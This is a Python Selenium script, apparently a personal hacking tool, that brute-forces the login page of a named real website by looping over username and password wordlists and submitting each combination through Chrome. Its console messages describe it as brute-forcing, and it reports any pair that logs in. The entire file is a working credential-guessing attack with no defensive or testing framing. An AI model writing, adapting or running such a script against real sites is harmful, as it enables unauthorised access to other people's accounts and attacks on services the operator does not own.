#coding:utf-8
#Author:LSA
#Data:20207114

from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from selenium.webdriver.common import action_chains, keys
import time

def Login(user,pwd):
    browser.get('http://www.lanyouba.com/')
    browser.implicitly_wait(7)
    elem = browser.find_element_by_id("username")
    elem.send_keys(user)
    elem=browser.find_element_by_id("password")
    elem.send_keys(pwd)
    elem=browser.find_element_by_id("button")
    elem.click()

    time.sleep(1)
    if '当前用户' in browser.page_source:
         print('Login Success:' + user + '|' + pwd)
         exit()
    else:
         print('LoginFaild!')

#复杂选不到的情况
def Brutemix(user, pwd):
    browser.get('http://www.lanyouba.com/')
    browser.implicitly_wait(20)
    action = action_chains.ActionChains(browser)
    elem = browser.find_element_by_name("username")
    elem.send_keys(user)
    action.perform()
    elem = browser.find_element_by_name("password")
    elem.send_keys(pwd)
    action.perform()
    elem = browser.find_element_by_name("submit")
    action.send_keys("document.getElementsByName('submit')[0].click()" + keys.Keys.ENTER)
    action.perform()

    time.sleep(1)
    if '当前用户' in browser.page_source:
        print('Login Success:' + user + '|' + pwd)
        exit()
    else:
        print('LoginFaild!')






print('[+] 正在后台打开谷歌浏览器...')
chrome_option = Options()
chrome_option.add_argument('blink-settings=imagesEnabled=false')
#chrome_option.add_argument('--headless')
chrome_option.add_experimental_option('excludeSwitches', ['enable-logging'])  # 关闭控制台日志
browser = webdriver.Chrome(executable_path="./chromedriver", chrome_options=chrome_option)
browser.set_page_load_timeout(500)

print('[+] 正在爆破中，请稍等 ~')


def main():

    with open('./username.txt','r') as fuser:
            for user in fuser.readlines():
                    u = user.strip()
                    with open('./pass.txt','r') as fpwd:
                        for pwd in fpwd.readlines():
                                p = pwd.strip()
                                print('testing...' + u,p)
                                Login(u,p)

    browser.quit()



if __name__ == '__main__':
    main()